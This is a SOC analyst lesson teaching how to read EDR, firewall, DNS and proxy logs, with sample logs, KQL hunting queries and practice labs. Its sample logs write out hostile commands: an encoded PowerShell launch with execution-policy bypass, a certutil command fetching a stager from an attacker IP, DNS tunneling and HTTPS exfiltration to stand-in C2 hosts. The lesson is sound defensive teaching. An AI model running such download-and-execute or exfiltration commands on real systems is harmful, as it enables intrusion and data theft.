# Lesson 8.4 — EDR, Firewall, DNS, and Proxy Logs

**Phase:** 8 — Log Reading and Analysis
**Prerequisite:** Lesson 8.3
**Time to complete:** 45 minutes

---

## EDR Logs — Microsoft Defender for Endpoint

### What EDR Logs Capture

EDR generates detailed telemetry for every action on the endpoint:
- Process creation and termination
- Network connections (outbound and inbound)
- File creation, modification, deletion
- Registry key reads and writes
- Memory injection events
- User logon/logoff

All of this is correlated and searchable in the EDR console (for MDE, in Microsoft Defender portal or via Advanced Hunting in Microsoft Sentinel).

### Microsoft Defender for Endpoint — Alert Example

```
Alert: Suspicious PowerShell command line
Severity: High
Status: New
Machine: LAPTOP-JSMITH (john.smith@company.com)
Detection time: 2024-03-15T14:22:47Z
Category: MalwareExecution

Evidence:
  Process Tree:
    winword.exe (PID 4521)
    └── cmd.exe (PID 7890)
        └── powershell.exe (PID 8234)
            Command: powershell.exe -exec bypass -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0A...
            └── certutil.exe (PID 9012)
                Command: certutil.exe -urlcache -f http://185.220.101.47/stager.bin 
                         C:\Windows\Temp\svchost32.exe
            └── C:\Windows\Temp\svchost32.exe (PID 9100)
                Network: 185.220.101.47:443 (HTTPS) [ESTABLISHED]
                File: C:\Users\john.smith\AppData\Roaming\winhlp.exe [CREATED]
                Registry: HKCU\...\Run\WindowsHelper = C:\Users\...\winhlp.exe [WRITTEN]
```

Reading this tree:
1. Word spawned cmd.exe (macro execution)
2. cmd.exe spawned PowerShell with bypass and hidden flags and encoded command
3. PowerShell decoded its command and ran certutil.exe to download a file
4. The downloaded file was executed (svchost32.exe — fake svchost name)
5. It connected to the attacker's C2 server (185.220.101.47:443)
6. It created a persistence mechanism in AppData and the Run registry key

This is a complete malware infection chain. True positive — Critical.

### Advanced Hunting Query (Microsoft Defender for Endpoint)

Advanced Hunting uses Kusto Query Language (KQL) for threat hunting.

Finding all encoded PowerShell executions:
```kql
DeviceProcessEvents
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-enc" or ProcessCommandLine contains "-EncodedCommand"
| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine, AccountName
| order by Timestamp desc
```

Finding C2 beaconing (regular connections):
```kql
DeviceNetworkEvents
| where RemoteIPType == "Public"
| where ActionType == "ConnectionSuccess"
| summarize ConnectionCount = count(), 
            MinInterval = min(Timestamp),
            MaxInterval = max(Timestamp)
            by DeviceName, RemoteIP, RemotePort, InitiatingProcessFileName
| where ConnectionCount > 100
| extend Duration = MaxInterval - MinInterval
```

Finding persistence via registry Run keys:
```kql
DeviceRegistryEvents
| where RegistryKey contains "\\CurrentVersion\\Run"
| where ActionType in ("RegistryValueSet", "RegistryValueCreated")
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, 
          InitiatingProcessFileName, AccountName
```

---

## Firewall Logs

### What Firewall Logs Capture

Firewall logs record network connections allowed or blocked at the perimeter (and sometimes internal).

Typical fields:
- Date/Time
- Source IP and Port
- Destination IP and Port
- Protocol (TCP/UDP/ICMP)
- Action (Allow/Block/Drop)
- Bytes sent/received
- Interface (which network interface)
- Rule name (which firewall rule matched)

### Firewall Log Formats

Palo Alto Networks firewall log:
```
2024/03/15 14:22:31, allow, 1, 2024/03/15 14:22:31, 192.168.1.55, 185.220.101.47, 192.168.1.55, 185.220.101.47, Internal-to-External, john.smith, john.smith, ssl, vsys1, Trust, Untrust, ethernet1/1, ethernet1/2, Permitted, 1234567890, 54321, 443, 6, 48392, 12440, company-firewall
```

More readable format (same log):
```
Date:       2024-03-15 14:22:31
Action:     allow
From:       192.168.1.55:54321 (Trust zone)
To:         185.220.101.47:443 (Untrust zone)  
Protocol:   TCP (6)
Rule:       Internal-to-External
User:       john.smith
App:        ssl (HTTPS)
Bytes_sent: 48392
Bytes_rcvd: 12440
```

Windows Firewall log format:
```
#Version: 1.5
#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin icmptype icmpcode info path

2024-03-15 14:22:31 ALLOW TCP 192.168.1.55 185.220.101.47 54321 443 - - - - - - - SEND
2024-03-15 14:22:32 ALLOW TCP 185.220.101.47 192.168.1.55 443 54321 - - - - - - - RECEIVE
2024-03-15 03:14:00 DROP TCP 185.220.101.47 203.0.113.50 52341 445 - - - - - - - RECEIVE
```

### Firewall Log Analysis Scenarios

Scenario 1 — Port scan detection:
```
03:00:00 DROP  TCP  185.220.101.47  203.0.113.50  49001  22    SYN  DROP
03:00:00 DROP  TCP  185.220.101.47  203.0.113.50  49002  80    SYN  DROP
03:00:00 ALLOW TCP  185.220.101.47  203.0.113.50  49003  443   SYN  ALLOW
03:00:00 DROP  TCP  185.220.101.47  203.0.113.50  49004  3389  SYN  DROP
03:00:00 DROP  TCP  185.220.101.47  203.0.113.50  49005  8080  SYN  DROP
```
Sequential port scan. Only 443 is open (allowed).

Scenario 2 — Outbound C2 beaconing:
```
14:00:00 ALLOW TCP 192.168.1.55 185.220.101.47 54321 443 48 SEND
14:05:00 ALLOW TCP 192.168.1.55 185.220.101.47 54322 443 48 SEND
14:10:00 ALLOW TCP 192.168.1.55 185.220.101.47 54323 443 48 SEND
14:15:00 ALLOW TCP 192.168.1.55 185.220.101.47 54324 443 48 SEND
```
Exactly every 5 minutes, tiny data (48 bytes), same external IP, HTTPS. Classic C2 beaconing.

Scenario 3 — Data exfiltration:
```
03:00:00 ALLOW TCP 10.0.5.22 45.142.212.100 54001 443 SEND bytes=4,832,141,024
```
4.8 GB outbound from a server at 3 AM. One single massive transfer. High confidence exfiltration.

Scenario 4 — Lateral movement via SMB:
```
03:22:00 ALLOW TCP 192.168.1.55 192.168.1.56 58001 445 SEND
03:22:01 ALLOW TCP 192.168.1.55 192.168.1.57 58002 445 SEND
03:22:02 ALLOW TCP 192.168.1.55 192.168.1.58 58003 445 SEND
[continues to .254]
```
Workstation scanning all other workstations on port 445 (SMB). Internal lateral movement.

---

## DNS Logs

### DNS Log Format

Microsoft DNS server log:
```
3/15/2024 14:22:31 AM 0BC4 PACKET UDP Rcv 192.168.1.55:51234 Q [0001 D NOERROR] A (4)mail(9)microsoft(3)com(0)
3/15/2024 14:22:31 AM 0BC4 PACKET UDP Snd 192.168.1.55:51234 R Q [8081 DR NOERROR] A 52.113.194.132
```

Sysmon Event ID 22 (DNS Query):
```xml
<EventID>22</EventID>
<TimeCreated>2024-03-15T14:22:31.123Z</TimeCreated>
<Computer>LAPTOP-JSMITH</Computer>
<QueryName>teams.microsoft.com</QueryName>
<QueryStatus>SUCCESS</QueryStatus>
<QueryResults>type: 5 cname: cloud.microsoft.com; ::ffff:52.113.194.132</QueryResults>
<User>john.smith@company.com</User>
<Image>C:\Program Files\Google\Chrome\Application\chrome.exe</Image>
```

### DNS Log Analysis Scenarios

Normal traffic:
```
14:22:31 LAPTOP-JSMITH → teams.microsoft.com → 52.113.194.132 (Microsoft Teams)
14:22:32 LAPTOP-JSMITH → outlook.office365.com → 52.97.190.130 (Outlook)
14:22:33 LAPTOP-JSMITH → sharepoint.company.com → 40.125.1.5 (SharePoint)
```

DGA malware:
```
03:00:01 LAPTOP-JSMITH → xjkqrp19ns.com → NXDOMAIN
03:00:02 LAPTOP-JSMITH → qzxkjmn47rt.net → NXDOMAIN
03:00:03 LAPTOP-JSMITH → wbmrpx83nt.org → NXDOMAIN
[400 more NXDOMAIN]
03:06:44 LAPTOP-JSMITH → plqmrx72kk.com → 185.220.101.47
```
Last one resolves — malware found its C2.

DNS tunneling:
```
14:22:01 LAPTOP-JSMITH → dGhpcyBpcyBleGZpbHRyYXRlZA==.evil-c2.com → NXDOMAIN
14:22:02 LAPTOP-JSMITH → aGVyZSBpcyBtb3JlIHN0b2xlbg==.evil-c2.com → NXDOMAIN
14:22:03 LAPTOP-JSMITH → ZGF0YSBiZWluZyBleGZpbA==.evil-c2.com → NXDOMAIN
```
Long base64 subdomains to the same parent domain = DNS tunneling.

Fast flux:
```
10:00:00 malware-c2.com → 185.220.101.47 TTL=30
10:00:30 malware-c2.com → 62.210.18.53 TTL=30
10:01:00 malware-c2.com → 91.108.4.100 TTL=30
```
IP changes every 30 seconds (TTL=30) = fast flux. Attackers constantly rotate IPs to evade blocking.

---

## Proxy Logs

### What Proxy Logs Capture

A proxy server sitting between internal users and the internet captures:
- Every URL visited
- Who visited it (user and source IP)
- The HTTP method
- Response code
- Data transferred (sent and received)
- User agent (browser/tool)
- Duration
- Whether it was allowed or blocked

### Proxy Log Format (Squid/Bluecoat)

```
1710505351.123   1234 192.168.1.55 TCP_MISS/200 48392 GET https://company-sharepoint.com/ john.smith DIRECT/104.215.148.63 text/html
```

Fields:
1. 1710505351.123 — Unix timestamp
2. 1234 — duration in milliseconds
3. 192.168.1.55 — client IP
4. TCP_MISS/200 — cache status / HTTP response code
5. 48392 — bytes transferred
6. GET — HTTP method
7. https://company-sharepoint.com/ — URL
8. john.smith — authenticated username
9. DIRECT/104.215.148.63 — how it connected / server IP
10. text/html — content type

### Proxy Log Analysis

Normal day for an employee:
```
09:00:11 john.smith GET https://outlook.office365.com/  200 45,392
09:00:44 john.smith GET https://google.com/search?q=excel+pivot+table 200 32,481
09:01:05 john.smith GET https://company-sharepoint.com/sites/Finance 200 28,432
```

Malware download:
```
14:33:21 john.smith GET http://185.220.101.47/payload.exe 200 2,481,024
             User-Agent: python-requests/2.28.0
```
Not a browser (python-requests), executable file, unknown external IP, 2.4 MB = malware download.

C2 beaconing:
```
03:15:00 [no user] GET http://185.220.101.47/gate.php?id=LAPTOP-JSMITH&status=idle
             User-Agent: Mozilla/4.0 (MSIE 6.0)  200  12
03:20:00 [no user] GET http://185.220.101.47/gate.php?id=LAPTOP-JSMITH&status=idle
             User-Agent: Mozilla/4.0 (MSIE 6.0)  200  12
```
Every 5 minutes, no user logged in, outdated browser user agent, gate.php (classic C2 endpoint name) = beaconing.

Data exfiltration via HTTPS POST:
```
03:00:00 [no user] POST https://transfer.sh/confidential-data.7z  200  4,832,141,024
             Content-Type: application/octet-stream
```
4.8 GB uploaded to a file transfer service at 3 AM by no logged-in user = exfiltration.

User visiting phishing site:
```
14:33:21 sarah.jones GET http://company-secure-login.net/verify 200 48,392
14:33:25 sarah.jones POST http://company-secure-login.net/verify 200 384
```
Visited phishing URL (GET), then submitted a form (POST = credentials entered). Sarah's credentials may be compromised.

---

## Correlating Across All Log Sources — Complete Example

Alert fires: "Malicious domain contacted from LAPTOP-BWILLIAMS"

Step 1 — EDR (What happened on the endpoint?):
```
Parent: winword.exe → cmd.exe → powershell.exe -enc [encoded]
  → svchost32.exe (created at C:\Windows\Temp\)
  → Network connection: evil-c2.com:443
  → File created: C:\Users\bwilliams\AppData\Roaming\winhlp32.exe
  → Registry: HKCU\Run\WindowsHelper = winhlp32.exe
```

Step 2 — Proxy Logs (What URLs were accessed?):
```
14:22:31 bob.williams POST https://evil-c2.com/gate.php 200 4,832,141,024
```

Step 3 — DNS Logs (What domains were resolved?):
```
14:22:29 LAPTOP-BWILLIAMS → evil-c2.com → 185.220.101.47
```

Step 4 — Firewall Logs (What network connections were made?):
```
14:22:31 ALLOW TCP 192.168.5.44:54321 → 185.220.101.47:443 bytes_sent=4,832,141,024
```

Step 5 — Windows Events (What changes were made?):
```
14:22:35 EventID 4698 Scheduled Task Created: \Helper → C:\AppData\winhlp32.exe every 1 hour
```

Complete picture:
- Malicious Word document executed a macro
- Macro ran an encoded PowerShell command
- PowerShell downloaded and executed malware
- Malware connected to C2 at evil-c2.com (185.220.101.47)
- 4.8 GB of data exfiltrated via HTTPS
- Persistence established via scheduled task and registry Run key

Timeline: 6 seconds from initial execution to active C2 connection.

---

## Summary

EDR logs: Deep endpoint process/file/network/registry telemetry. Process trees reveal the full attack chain.
Firewall logs: Network connection allow/block. Good for port scans, exfiltration, beaconing, lateral movement.
DNS logs: Every domain every device tried to reach. Key for DGA, tunneling, C2, new malicious domains.
Proxy logs: Full URL visibility, user agents, data volumes. Good for malware downloads, C2, exfiltration, phishing victim identification.
Cross-source correlation: The full attack picture requires all sources together. No single source tells the whole story.

---

## Practice Log Analysis Lab

### Lab 1 — Analyze this firewall log sequence:
```
2024-03-15 02:00:00 ALLOW TCP 10.0.5.22  185.220.101.47 54001 8080 bytes=512
2024-03-15 02:05:00 ALLOW TCP 10.0.5.22  185.220.101.47 54002 8080 bytes=512
2024-03-15 02:10:00 ALLOW TCP 10.0.5.22  185.220.101.47 54003 8080 bytes=512
[continues every 5 minutes until 06:00 AM]
2024-03-15 06:00:00 ALLOW TCP 10.0.5.22  185.220.101.47 54050 8080 bytes=4,718,012,288
```
Question: What happened? Describe the attack in your own words.

### Lab 2 — DNS Analysis:
```
03:00:01 192.168.3.44 → support.windows-update.com → 185.220.101.47
```
WHOIS shows: windows-update.com is owned by Microsoft.
windows-update.com resolves to: 20.84.240.100 (Microsoft).
support.windows-update.com resolves to: 185.220.101.47 (unknown, threat intel: C2 server).
Question: Is this the real Microsoft Windows Update? Why or why not? What is suspicious?

### Lab 3 — Proxy + EDR Correlation:
Proxy: bob.williams downloaded "Invoice-March.docm" from external site at 14:22.
EDR: winword.exe started at 14:23, spawned powershell.exe at 14:23:15.
Windows Events: 4688 at 14:23:15, powershell.exe with -enc flag, parent winword.exe.
Firewall: 192.168.5.44 → 185.220.101.47:443 ALLOW at 14:23:22.
Question: Write a 5-sentence summary of what happened, suitable for a Tier 2 escalation.
